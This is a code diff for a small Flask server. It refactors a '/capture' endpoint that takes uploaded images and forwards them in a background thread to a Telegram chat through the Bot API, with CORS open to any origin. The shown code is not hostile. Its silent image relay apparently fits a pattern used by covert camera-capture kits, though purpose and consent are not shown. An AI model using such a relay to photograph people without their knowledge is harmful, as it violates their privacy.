@@ -1,30 +1,38 @@
 from flask import Flask, request
 from flask_cors import CORS
+import threading
+import requests
 import os
-import asyncio
-from telegram import Bot
 
 app = Flask(__name__)
 CORS(app)
 
-BOT_TOKEN = os.environ["BOT_TOKEN"]
-CHAT_ID = os.environ["CHAT_ID"]
+BOT_TOKEN = os.environ.get("BOT_TOKEN")
+CHAT_ID = os.environ.get("CHAT_ID")
 
-bot = Bot(token=BOT_TOKEN)
+TELEGRAM_URL = f"https://api.telegram.org/bot{BOT_TOKEN}/sendPhoto"
 
-@app.route("/")
-def health():
-    return "OK", 200
-
-async def send_photo(image_bytes):
-    await bot.send_photo(chat_id=CHAT_ID, photo=image_bytes)
+def send_photo_async(image_bytes):
+    files = {
+        "photo": ("image.jpg", image_bytes)
+    }
+    data = {
+        "chat_id": CHAT_ID
+    }
+    requests.post(TELEGRAM_URL, data=data, files=files, timeout=10)
 
 @app.route("/capture", methods=["POST"])
 def capture():
     image = request.files["image"]
     img_bytes = image.read()
 
-    # Fire-and-forget async task
-    asyncio.get_event_loop().create_task(send_photo(img_bytes))
+    threading.Thread(
+        target=send_photo_async,
+        args=(img_bytes,)
+    ).start()
 
     return "OK", 200
+
+@app.route("/")
+def health():
+    return "alive", 200
